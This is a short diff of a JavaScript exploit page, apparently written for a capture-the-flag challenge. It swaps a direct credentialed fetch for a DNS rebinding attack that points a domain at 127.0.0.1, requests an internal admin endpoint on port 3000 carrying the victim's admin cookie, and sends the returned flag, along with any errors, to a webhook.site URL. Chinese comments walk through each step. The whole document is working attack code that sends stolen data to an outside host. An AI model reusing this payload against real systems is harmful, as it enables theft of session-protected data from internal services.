@@ -1,15 +1,23 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-fetch('http://223.6.249.127:21959/admin', {
-  method: 'GET',
-  credentials: 'include'
-})
-.then(r => r.text())
-.then(flag => {
-  fetch('https://webhook.site/8628933e-d978-4419-aac9-b31ee4efdb1a?flag=' + encodeURIComponent(flag));
-});
+// DNS Rebinding 域名（下一步生成后填入）
+const REBIND_DOMAIN = 'b9c76d99.7f000001.rbndr.us'; 
+// Webhook.site 的 UUID（第1步复制的内容）
+const WEBHOOK_UUID = '8628933e-d978-4419-aac9-b31ee4efdb1a'; 
+
+setTimeout(() => {
+  // 等待 3 秒后，DNS 应已切换到 127.0.0.1
+  // 访问内网 Admin 接口（带 3000 端口！）
+  fetch('http://' + REBIND_DOMAIN + ':3000/admin', {
+    credentials: 'include'  // 携带 Admin Cookie
+  })
+  .then(r => r.json())
+  .then(data => {
+    // 将 Flag 外带到 webhook.site
+    fetch('https://webhook.site/' + WEBHOOK_UUID + '?flag=' + encodeURIComponent(data.flag));
+  })
+  .catch(e => {
+    // 错误也上报，方便调试
+    fetch('https://webhook.site/' + WEBHOOK_UUID + '?error=' + encodeURIComponent(e.message));
+  });
+}, 3000);
 </script>
-</body>
-</html>
